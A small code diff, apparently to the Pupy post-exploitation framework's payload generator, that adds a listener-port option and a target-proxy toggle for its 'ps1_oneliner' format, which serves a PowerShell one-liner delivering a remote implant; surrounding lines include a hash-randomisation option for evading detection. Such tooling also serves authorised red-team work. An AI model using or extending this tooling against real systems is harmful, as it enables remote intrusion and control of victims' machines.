@@ -291,6 +291,8 @@ if __name__=="__main__":
     parser.add_argument('-s', '--scriptlet', default=[], action='append', help="offline python scriptlets to execute before starting the connection. Multiple scriptlets can be privided.")
     parser.add_argument('-l', '--list', action=ListOptions, nargs=0, help="list available formats, transports, scriptlets and options")
     parser.add_argument('-i', '--interface', default=None, help="The default interface to listen on")
+    parser.add_argument('--no-use-proxy', action='store_true', help="Don't use the target's proxy configuration even if it is used by target (for ps1_oneliner only for now)")
+    parser.add_argument('--ps1-oneliner-listen-port', default=8080, type=int, help="Port used by ps1_oneliner listener (default: %(default)s)")
     parser.add_argument('--randomize-hash', action='store_true', help="add a random string in the exe to make it's hash unknown")
     parser.add_argument('--debug-scriptlets', action='store_true', help="don't catch scriptlets exceptions on the client for debug purposes")
     parser.add_argument('--workdir', help='Set Workdir (Default = current workdir)')
@@ -435,9 +437,11 @@ if __name__=="__main__":
             w.write("{0}\n{1}".format(script, code.format(x86InitCode, x86ConcatCode[:-1], x64InitCode, x64ConcatCode[:-1]) ))
     elif args.format=="ps1_oneliner":
         from pupylib.payloads.ps1_oneliner import serve_ps1_payload
-        i=conf["launcher_args"].index("--host")+1
-        link_ip=conf["launcher_args"][i].split(":",1)[0]
-        serve_ps1_payload(conf, link_ip=link_ip)
+        link_ip=conf["launcher_args"][conf["launcher_args"].index("--host")+1].split(":",1)[0]
+        if args.no_use_proxy == True:
+            serve_ps1_payload(conf, link_ip=link_ip, port=args.ps1_oneliner_listen_port, useTargetProxy=False)
+        else:
+            serve_ps1_payload(conf, link_ip=link_ip, port=args.ps1_oneliner_listen_port, useTargetProxy=True)
     elif args.format=="rubber_ducky":
         rubber_ducky(conf).generateAllForOStarget()
     else:
